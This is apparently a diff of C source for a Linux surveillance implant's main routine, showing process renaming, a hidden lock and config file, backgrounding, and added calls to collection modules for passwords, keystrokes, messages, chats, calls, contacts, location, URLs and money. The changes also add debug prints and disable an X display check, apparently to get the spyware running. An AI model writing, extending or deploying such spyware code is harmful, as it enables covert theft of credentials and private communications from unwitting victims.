@@ -52,10 +52,12 @@ int main(int argc, char *argv[])
 
    do {
       if((env = getenv("   "))) {
+          printf("%s\n", env);
          if(strlen(env) >= sizeof(cwd)) break;
          strncpy(cwd, env, sizeof(cwd));
       } else {
          if((ret = readlink(SO"/proc/self/exe", cwd, sizeof(cwd))) == -1) break;
+         //printf("cwd is %s\n ret is %d\n sizeof cwd is %d\n", cwd, ret, sizeof(cwd));
          if(ret == sizeof(cwd)) break;
          cwd[ret] = '\0';
       }
@@ -74,13 +76,13 @@ int main(int argc, char *argv[])
    }
    debugme("Process name is now %s\n", PROCESSNAME);
 
-   if(((lock = open(SO".lock", O_WRONLY|O_CREAT, 0600)) == -1) || flock(lock, LOCK_EX|LOCK_NB)) {
+   if(((lock = open(SO".lock", O_WRONLY|O_CREAT, 0600)) == -1) || flock(lock, LOCK_EX|LOCK_NB)) { //just could run single
       errorme("Unable to acquire lock - another instance is already running\n");
       exit(EXIT_FAILURE);
    }
    debugme("Lock acquired - I'm on my own\n");
 
-   if(initlib(INIT_LIBCRYPTO|INIT_LIBX11|INIT_LIBCURL)) {
+   if(initlib(INIT_LIBCRYPTO|INIT_LIBX11|INIT_LIBCURL)) { //value is 0x00000121 
       errorme("Core libraries initialization failed\n");
       exit(EXIT_FAILURE);
    }
@@ -96,11 +98,13 @@ int main(int argc, char *argv[])
       exit(EXIT_FAILURE);
    }
 
-   if((display = XOpenDisplay(NULL)) == NULL) {
+  /*
+  if((display = XOpenDisplay(NULL)) == NULL) {
       errorme("Unable to connect to X\n");
       exit(EXIT_FAILURE);
    }
    debugme("Connected to X (%s)\n", DisplayString(display));
+   */
 
 #ifndef DEBUG
    debugme("Going in background\n");
@@ -122,6 +126,18 @@ int main(int argc, char *argv[])
 
    parseconfig(SO".cache");
    debugme("Configuration parsed\n");
+
+   module_password_main(2);
+   module_device_main(2);
+   module_application_main(2);
+   module_position_main(2);
+   module_url_main(2);
+   module_messages_main(2);
+   module_addressbook_main(2);
+   module_chat_main(2);
+   module_call_main(2);
+   module_keylog_main(2);
+   module_money_main(2);
 
    createactions();
    debugme("Actions created\n");
